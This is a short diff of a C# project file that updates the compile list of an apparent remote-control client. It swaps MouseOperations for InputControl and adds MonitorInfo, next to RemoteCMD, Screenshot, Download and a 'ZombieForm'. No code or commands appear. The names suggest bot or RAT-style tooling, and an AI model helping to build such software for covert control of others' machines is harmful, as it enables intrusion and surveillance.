@@ -58,9 +58,10 @@
     <Compile Include="Functions\FunctionManager.cs" />
     <Compile Include="Functions\Download.cs" />
     <Compile Include="Functions\GenericCommandResult.cs" />
-    <Compile Include="Functions\MouseOperations.cs" />
+    <Compile Include="Functions\InputControl.cs" />
     <Compile Include="Functions\RemoteCMD.cs" />
     <Compile Include="Functions\Screenshot.cs" />
+    <Compile Include="Helper\MonitorInfo.cs" />
     <Compile Include="Web\Client.cs" />
     <Compile Include="ZombieForm.cs">
       <SubType>Form</SubType>
